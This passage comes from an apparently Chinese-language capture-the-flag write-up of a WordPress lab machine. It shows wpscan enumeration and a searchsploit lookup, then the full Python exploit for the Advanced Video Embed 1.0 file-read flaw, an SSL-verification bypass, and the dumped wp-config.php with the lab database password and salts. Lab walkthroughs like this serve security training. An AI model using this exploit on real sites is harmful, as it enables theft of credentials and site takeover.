class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wpscan --url &quot;https://10.0.3.35:12380/blogblog/&quot;   --disable-tls-checks -e ap  --plugins-detection aggressive</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.27</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] URL: https://10.0.3.35:12380/blogblog/ [10.0.3.35]</span></span><br><span class="line"><span class="string">[+] Started: Tue Dec 10 04:13:46 2024</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Interesting Finding(s):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Headers</span></span><br><span class="line"><span class="string"> | Interesting Entries:</span></span><br><span class="line"><span class="string"> |  - Server: Apache/2.4.18 (Ubuntu)</span></span><br><span class="line"><span class="string"> |  - Dave: Soemthing doesn&#x27;</span>t look right here</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: https://10.0.3.35:12380/blogblog/xmlrpc.php</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  - Link Tag (Passive Detection), 30% confidence</span><br><span class="line"> |  - Direct Access (Aggressive Detection), 100% confidence</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: https://10.0.3.35:12380/blogblog/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Registration is enabled: https://10.0.3.35:12380/blogblog/wp-login.php?action=register</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: https://10.0.3.35:12380/blogblog/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: https://10.0.3.35:12380/blogblog/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.2.1 identified (Insecure, released on 2015-04-27).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/?feed=rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/?feed=comments-rss2, &lt;generator&gt;http://wordpress.org/?v=4.2.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme <span class="keyword">in</span> use: bhost</span><br><span class="line"> | Location: https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/</span><br><span class="line"> | Last Updated: 2024-03-13T00:00:00.000Z</span><br><span class="line"> | Readme: https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/readme.txt</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 1.8</span><br><span class="line"> | Style URL: https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1</span><br><span class="line"> | Style Name: BHost</span><br><span class="line"> | Description: Bhost is a <span class="built_in">nice</span> , clean , beautifull, Responsive and modern design free WordPress Theme. This theme ...</span><br><span class="line"> | Author: Masum Billah</span><br><span class="line"> | Author URI: http://getmasum.net/</span><br><span class="line"> |</span><br><span class="line"> | Found By: Css Style In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.2.9 (80% confidence)</span><br><span class="line"> | Found By: Style (Passive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/themes/bhost/style.css?ver=4.2.1, Match: <span class="string">&#x27;Version: 1.2.9&#x27;</span></span><br><span class="line"></span><br><span class="line">[+] Enumerating All Plugins (via Aggressive Methods)</span><br><span class="line"> Checking Known Locations - Time: 00:03:45 &lt;============================================================================================================================&gt; (108105 / 108105) 100.00% Time: 00:03:45</span><br><span class="line">[+] Checking Plugin Versions (via Passive and Aggressive Methods)                                                                                                                            </span><br><span class="line">                                                                                                                                                                                             </span><br><span class="line">[i] Plugin(s) Identified:                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                             </span><br><span class="line">[+] advanced-video-embed-embed-videos-or-playlists                                                                                                                                           </span><br><span class="line"> | Location: https://10.0.3.35:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/                                                                             </span><br><span class="line"> | Latest Version: 1.0 (up to <span class="built_in">date</span>)                                                                                                                                                          </span><br><span class="line"> | Last Updated: 2015-10-14T13:52:00.000Z                                                                                                                                                                         </span><br><span class="line"> | Readme: https://10.0.3.35:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt                                                                                          </span><br><span class="line"> | [!] Directory listing is enabled</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/advanced-video-embed-embed-videos-or-playlists/readme.txt</span><br><span class="line"></span><br><span class="line">[+] akismet</span><br><span class="line"> | Location: https://10.0.3.35:12380/blogblog/wp-content/plugins/akismet/</span><br><span class="line"> | Latest Version: 5.3.5</span><br><span class="line"> | Last Updated: 2024-11-19T02:02:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/akismet/, status: 403</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[+] shortcode-ui</span><br><span class="line"> | Location: https://10.0.3.35:12380/blogblog/wp-content/plugins/shortcode-ui/</span><br><span class="line"> | Last Updated: 2019-01-16T22:56:00.000Z</span><br><span class="line"> | Readme: https://10.0.3.35:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 0.7.4</span><br><span class="line"> | [!] Directory listing is enabled</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/shortcode-ui/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | Version: 0.6.2 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/shortcode-ui/readme.txt</span><br><span class="line"></span><br><span class="line">[+] two-factor</span><br><span class="line"> | Location: https://10.0.3.35:12380/blogblog/wp-content/plugins/two-factor/</span><br><span class="line"> | Latest Version: 0.10.0</span><br><span class="line"> | Last Updated: 2024-12-02T10:06:00.000Z</span><br><span class="line"> | Readme: https://10.0.3.35:12380/blogblog/wp-content/plugins/two-factor/readme.txt</span><br><span class="line"> | [!] Directory listing is enabled</span><br><span class="line"> |</span><br><span class="line"> | Found By: Known Locations (Aggressive Detection)</span><br><span class="line"> |  - https://10.0.3.35:12380/blogblog/wp-content/plugins/two-factor/, status: 200</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br><span class="line"></span><br><span class="line">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span><br><span class="line">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span><br><span class="line"></span><br><span class="line">[+] Finished: Tue Dec 10 04:17:49 2024</span><br><span class="line">[+] Requests Done: 108107</span><br><span class="line">[+] Cached Requests: 63</span><br><span class="line">[+] Data Sent: 31.192 MB</span><br><span class="line">[+] Data Received: 14.454 MB</span><br><span class="line">[+] Memory used: 556.508 MB</span><br><span class="line">[+] Elapsed time: 00:04:03</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>经查 Advanced Video 1.0 - Local File Inclusion</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># searchsploit wordpress advanced-v</span></span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line"> Exploit Title                                                                                                                                                                                            |  Path</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">WordPress Plugin Advanced Video 1.0 - Local File Inclusion                                                                                                                                                | php/webapps/39646.py</span><br><span class="line">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="line">Shellcodes: No Results</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># locate php/webapps/39646.py | cat </span></span><br><span class="line">/usr/share/exploitdb/exploits/php/webapps/39646.py</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/39646.py</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation</span></span><br><span class="line"><span class="comment"># Google Dork: N/A</span></span><br><span class="line"><span class="comment"># Date: 04/01/2016</span></span><br><span class="line"><span class="comment"># Exploit Author: evait security GmbH</span></span><br><span class="line"><span class="comment"># Vendor Homepage: arshmultani - http://dscom.it/</span></span><br><span class="line"><span class="comment"># Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/</span></span><br><span class="line"><span class="comment"># Version: 1.0</span></span><br><span class="line"><span class="comment"># Tested on: Linux Apache / Wordpress 4.2.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#       Timeline</span></span><br><span class="line"><span class="comment">#       03/24/2016 - Bug discovered</span></span><br><span class="line"><span class="comment">#       03/24/2016 - Initial notification of vendor</span></span><br><span class="line"><span class="comment">#       04/01/2016 - No answer from vendor, public release of bug</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Vulnerable Code (/inc/classes/class.avePost.php) Line 57:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#  function ave_publishPost()&#123;</span></span><br><span class="line"><span class="comment">#    $title = $_REQUEST[&#x27;title&#x27;];</span></span><br><span class="line"><span class="comment">#    $term = $_REQUEST[&#x27;term&#x27;];</span></span><br><span class="line"><span class="comment">#    $thumb = $_REQUEST[&#x27;thumb&#x27;];</span></span><br><span class="line"><span class="comment"># &lt;snip&gt;</span></span><br><span class="line"><span class="comment"># Line 78:</span></span><br><span class="line"><span class="comment">#    $image_data = file_get_contents($thumb);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=random&amp;short=1&amp;term=1&amp;thumb=[FILEPATH]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Exploit - Print the content of wp-config.php in terminal (default Wordpress config)</span></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line">import urllib2</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/wordpress&quot;</span> <span class="comment"># insert url to wordpress</span></span><br><span class="line"></span><br><span class="line">randomID = long(random.random() * 100000000000000000L)</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=&#x27;</span> + str(randomID) + <span class="string">&#x27;&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&#x27;</span>)</span><br><span class="line">content =  objHtml.readlines()</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        numbers = re.findall(r<span class="string">&#x27;\d+&#x27;</span>,line)</span><br><span class="line">        <span class="built_in">id</span> = numbers[-1]</span><br><span class="line">        <span class="built_in">id</span> = int(<span class="built_in">id</span>) / 10</span><br><span class="line"></span><br><span class="line">objHtml = urllib2.urlopen(url + <span class="string">&#x27;/?p=&#x27;</span> + str(<span class="built_in">id</span>))</span><br><span class="line">content = objHtml.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;attachment-post-thumbnail size-post-thumbnail wp-post-image&#x27;</span> <span class="keyword">in</span> line:</span><br><span class="line">                urls=re.findall(<span class="string">&#x27;&quot;(https?://.*?)&quot;&#x27;</span>, line)</span><br><span class="line">                <span class="built_in">print</span> urllib2.urlopen(urls[0]).<span class="built_in">read</span>() </span><br></pre></td></tr></table></figure>
<h2 id="local-file-inclusion">7. Local File Inclusion</h2>
<p>脚本排错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># python2 39646.py</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;39646.py&quot;</span>, line 41, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    objHtml = urllib2.urlopen(url + <span class="string">&#x27;/wp-admin/admin-ajax.php?action=ave_publishPost&amp;title=&#x27;</span> + str(randomID) + <span class="string">&#x27;&amp;short=rnd&amp;term=rnd&amp;thumb=../wp-config.php&#x27;</span>)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/urllib2.py&quot;</span>, line 154, <span class="keyword">in</span> urlopen</span><br><span class="line">    <span class="built_in">return</span> opener.open(url, data, <span class="built_in">timeout</span>)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/urllib2.py&quot;</span>, line 429, <span class="keyword">in</span> open</span><br><span class="line">    response = self._open(req, data)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/urllib2.py&quot;</span>, line 447, <span class="keyword">in</span> _open</span><br><span class="line">    <span class="string">&#x27;_open&#x27;</span>, req)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/urllib2.py&quot;</span>, line 407, <span class="keyword">in</span> _call_chain</span><br><span class="line">    result = func(*args)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/urllib2.py&quot;</span>, line 1248, <span class="keyword">in</span> https_open</span><br><span class="line">    context=self._context)</span><br><span class="line">  File <span class="string">&quot;/usr/lib/python2.7/urllib2.py&quot;</span>, line 1205, <span class="keyword">in</span> do_open</span><br><span class="line">    raise URLError(err)</span><br><span class="line">urllib2.URLError: &lt;urlopen error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed (_ssl.c:733)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>添加</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl </span><br><span class="line"><span class="comment"># 忽略 SSL 证书验证 </span></span><br><span class="line">ssl._create_default_https_context = ssl._create_unverified_context</span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412101921951.jpg" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202412101922050.jpg" /></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wget --no-check-certificate https://10.0.3.35:12380/blogblog/wp-content/uploads/284578888.jpeg</span></span><br><span class="line">--2024-12-10 04:36:56--  https://10.0.3.35:12380/blogblog/wp-content/uploads/284578888.jpeg</span><br><span class="line">Connecting to 10.0.3.35:12380... connected.</span><br><span class="line">WARNING: The certificate of ‘10.0.3.35’ is not trusted.</span><br><span class="line">WARNING: The certificate of ‘10.0.3.35’ doesn<span class="string">&#x27;t have a known issuer.</span></span><br><span class="line"><span class="string">The certificate&#x27;</span>s owner does not match hostname ‘10.0.3.35’</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3042 (3.0K) [image/jpeg]</span><br><span class="line">Saving to: ‘284578888.jpeg’</span><br><span class="line"></span><br><span class="line">284578888.jpeg                                             100%[========================================================================================================================================&gt;]   2.97K  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2024-12-10 04:36:56 (117 MB/s) - ‘284578888.jpeg’ saved [3042/3042]</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># file 284578888.jpeg </span></span><br><span class="line">284578888.jpeg: PHP script, ASCII text</span><br><span class="line">                                                                                                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># cat 284578888.jpeg                                     </span></span><br><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * The base configurations of the WordPress.</span><br><span class="line"> *</span><br><span class="line"> * This file has the following configurations: MySQL settings, Table Prefix,</span><br><span class="line"> * Secret Keys, and ABSPATH. You can find more information by visiting</span><br><span class="line"> * &#123;@<span class="built_in">link</span> https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php&#125;</span><br><span class="line"> * Codex page. You can get the MySQL settings from your web host.</span><br><span class="line"> *</span><br><span class="line"> * This file is used by the wp-config.php creation script during the</span><br><span class="line"> * installation. You don<span class="string">&#x27;t have to use the web site, you can just copy this file</span></span><br><span class="line"><span class="string"> * to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> * @package WordPress</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// ** MySQL settings - You can get this info from your web host ** //</span></span><br><span class="line"><span class="string">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>wordpress<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database username */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USER<span class="string">&#x27;, &#x27;</span>root<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL database password */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>plbkac<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** MySQL hostname */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_HOST<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_CHARSET<span class="string">&#x27;, &#x27;</span>utf8mb4<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/** The Database Collate type. Don&#x27;</span>t change this <span class="keyword">if</span> <span class="keyword">in</span> doubt. */</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line"></span><br><span class="line">/**<span class="comment">#@+</span></span><br><span class="line"> * Authentication Unique Keys and Salts.</span><br><span class="line"> *</span><br><span class="line"> * Change these to different unique phrases!</span><br><span class="line"> * You can generate these using the &#123;@<span class="built_in">link</span> https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span><br><span class="line"> * You can change these at any point <span class="keyword">in</span> time to invalidate all existing cookies. This will force all <span class="built_in">users</span> to have to <span class="built_in">log</span> <span class="keyword">in</span> again.</span><br><span class="line"> *</span><br><span class="line"> * @since 2.6.0</span><br><span class="line"> */</span><br><span class="line">define(<span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;V 5p=[.Vds8~SX;&gt;t)++Tt57U6&#123;Xe`T|oW^eQ!mHr &#125;]&gt;9RX07W&lt;sZ,I~`6Y5-T:&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;vJZq=p.Ug,]:&lt;-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+&#125;&amp;!/#&gt;4#K7eFP5-av`n)2&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;ql-Vfg[?v6&#123;ZR*+O)|Hf OpPWYfKX0Jmpl8zU&lt;cr.wm?|jqZH:YMv;zu@tM7P:4o&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;j|V8J.~n&#125;R2,mlU%?C8o2[~6Vo1&#123;Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;I&#123;gDlDs`Z@.+/AdyzYw4%+&lt;WsO-LDBHT&#125;&gt;&#125;!||Xrf@1E6jJNV=&#123;p1?yMKYec*OI$&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;.HJmx^zb];5P&#125;hM-uJ%^+9=0SBQEh[[*&gt;#z+p&gt;nVi10`XOUq (Zml~op3SG4OG_D&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span 